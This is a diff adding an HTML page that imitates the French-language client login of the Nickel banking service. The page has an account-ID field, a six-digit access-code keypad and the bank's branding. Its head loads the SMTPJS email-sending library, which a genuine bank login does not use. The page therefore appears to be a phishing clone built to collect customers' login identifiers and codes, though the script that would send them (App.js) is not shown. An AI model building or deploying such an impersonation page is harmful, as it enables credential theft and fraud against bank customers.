@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <link rel="stylesheet" href="assets/css/bootstrap.min.css">
+    <link rel="stylesheet" href="assets/font-awesome/css/font-awesome.min.css">
+    <meta name="description" content="Nickel - Login page">
+    <meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no,maximum-scale=1,user-scalable=0">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+
+    <style>
+        .btnClient {
+            background-color: #fff;
+            padding: 20px 20px 20px 20px;
+            border-radius: 30px;
+            width: 230px;
+            text-align: center;
+            color: #ff5f01;
+            font-weight: bold;
+        }
+
+        .btnClient a {
+            color: #ff5f01;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .contain1 {
+            background-color: #ff5f01;
+        }
+
+        .custom {
+            color: #ff5f01;
+        }
+
+        input {
+            text-align: center;
+        }
+
+        input[checked] {
+            border: 1px solid #ff5f01;
+        }
+
+        .btn-cus {
+            height: 42px;
+            width: 42px;
+            padding: 3px 3px 3px 3px;
+            font-size: 18px;
+            margin: 8px;
+            border-radius: 10px;
+
+        }
+
+        .btn-cus:hover, .btn-cus:after {
+            background-color: #ff5f01;
+            color: #fff;
+        }
+
+        .div-btn{
+            horiz-align: center;
+        }
+
+        .linkc {
+            color: black;
+            text-decoration: underline;
+        }
+
+        .customBorder {
+            border: 1px solid #ff5f01;
+            padding: 9px 6px 6px 6px;
+            height: 45px;
+            text-align: center;
+            background-color: #fff;
+            border-radius: 5px
+        }
+
+        #showLabel {
+            font-size: 25px;
+        }
+
+    </style>
+
+    <link rel="stylesheet" href="assets/css/custom.css">
+
+    <title>Nickel</title>
+
+</head>
+<body>
+<nav class="navbar navbar-expand-sm navbar-light bg-light" id="nav">
+    <a class="navbar-brand" href="#"><img src="assets/img/Nickel.png" height="50"  alt=""></a>
+
+    <div class="collapse navbar-collapse">
+        <ul class="navbar-nav mr-auto mt-2 mt-lg-0">
+        </ul>
+    </div>
+</nav>
+
+<div class="container-fluid mt-2 full-content">
+
+    <div class="contain-prin">
+        <div class="row inner">
+
+            <div class="col-md-5 contain1" style="height: 80%">
+
+                <div class="bg-custom">
+                    <div class="" style="height: 100%">
+                        <img src="assets/img/minLogo.png" alt="" height="50" class="mt-5 ml-3">
+                    </div>
+
+                    <div class="" >
+                        <img src="assets/img/backleft.png" alt="" class="img-fluid">
+
+                        <div style="height: 100px" class="text-center mt-5">
+                            <a class="btnClient text-center mt-5" href="">Pas encore client Nickel ?</a> <br><br>
+                            <span class="text-light"><i class="fa fa-warning"></i><a href="" class="text-light">Attention à la fraude</a></span>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+
+            <div class="col-md-7 contain2">
+                <h5 class="custom text-center">Connectez-vous à votre espace client Nickel </h5>
+                <br>
+
+                <div>
+                    <div class="mb-4">
+                        <div class="">
+                            <strong class="custom">Identifiant:</strong>
+                            <a class="float-right linkc" href="">Ou trouver mon identifiant ?</a>
+                        </div>
+
+                        <div class="form-group">
+                            <input id="codeValue" placeholder="XXX XXX XXX X" style="height: 50px; font-size: 33px" pattern="\d{3}\ \d{3}\ \d{3}\ \d{1}" data-mask="999 999 999 9" class='form-control' onkeyup="showSecond()" />
+                            <div id="showLabel" class="text-center">
+                                <span id="codeLabelShow"></span>
+                                &nbsp;&nbsp;&nbsp; <i class='fa fa-pencil custom' id='resetall'></i>
+                            </div>
+                        </div>
+                        <label class="containcheck">
+                            <input type="checkbox">
+                            <span class="checkmark"></span>
+                        </label>
+                        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<label for="">Se souvenir de moi</label>
+
+                    </div>
+                </div>
+
+
+
+
+
+                <div id="second">
+                    <div class="">
+                        <strong class="custom">Code d'accès:</strong>
+                        <a class="float-right linkc" href="">Quel est mon code d'accès ?</a>
+                    </div>
+                    <div class="customBorder">
+                        <div>
+                            <label class="containeradio">
+                                <input class="inputChecked" type="radio" id="c1" disabled>
+                                <span class="checkmarkradio"></span>
+                            </label>
+
+                            <label class="containeradio">
+                                <input class="inputChecked" type="radio" id="c2" disabled>
+                                <span class="checkmarkradio"></span>
+                            </label>
+
+                            <label class="containeradio">
+                                <input class="inputChecked" type="radio" id="c3" disabled>
+                                <span class="checkmarkradio"></span>
+                            </label>
+
+                            <label class="containeradio">
+                                <input class="inputChecked" type="radio" id="c4" disabled>
+                                <span class="checkmarkradio"></span>
+                            </label>
+                            <label class="containeradio">
+                                <input class="inputChecked" type="radio" id="c5" disabled>
+                                <span class="checkmarkradio"></span>
+                            </label>
+                            <label class="containeradio">
+                                <input class="inputChecked" type="radio" id="c6" disabled>
+                                <span class="checkmarkradio"></span>
+                            </label>
+
+                            &nbsp;&nbsp;<img src="assets/img/refresh1.png" alt="" height="20" style="cursor: pointer; margin-bottom: 8px" id="btnRefreshCode">
+                        </div>
+                    </div>
+
+                    <div class='row div-btn'>
+                        <div class="col-md-12 col-sm-12 col-lg-12 text-center">
+                            <button id="0" class="btn btn-light btn-sm custom btn-cus" onclick="addChecked(this)">0</button>
+                            <button id="1" class="btn btn-light btn-sm custom btn-cus" onclick="addChecked(this)">1</button>
+                            <button id="2" class="btn btn-light btn-sm custom btn-cus" onclick="addChecked(this)">2</button>
+                            <button id="3" class="btn btn-light btn-sm custom btn-cus" onclick="addChecked(this)">3</button>
+                            <button id="4" class="btn btn-light btn-sm custom btn-cus" onclick="addChecked(this)">4</button>
+                        </div>
+
+                        <div class="col-md-12 col-sm-12 col-lg-12 text-center">
+                            <button id="5" class="btn btn-light btn-sm custom btn-cus" onclick="addChecked(this)">5</button>
+                            <button id="6"   class="btn btn-light btn-sm custom btn-cus" onclick="addChecked(this)">6</button>
+                            <button id="7"   class="btn btn-light btn-sm custom btn-cus" onclick="addChecked(this)">7</button>
+                            <button id="8"  class="btn btn-light btn-sm custom btn-cus" onclick="addChecked(this)">8</button>
+                            <button id="9"  class="btn btn-light btn-sm custom btn-cus" onclick="addChecked(this)">9</button>
+                        </div>
+
+                    </div>
+
+                </div>
+
+                <div class="text-center mt-5">
+                    <a href='' class="linkc">Faire opposition</a> <br/>
+                    <a href="" class="linkc">Première connexion?</a>
+                </div>
+
+
+            </div>
+        </div>
+
+    </div>
+
+</div>
+
+<script src="assets/js/jquery.js"></script>
+<script src="assets/js/bootstrap.min.js"></script>
+<script src="assets/js/jquery.mask.js"></script>
+
+<script src="assets/js/App.js"></script>
+</body>
+</html>
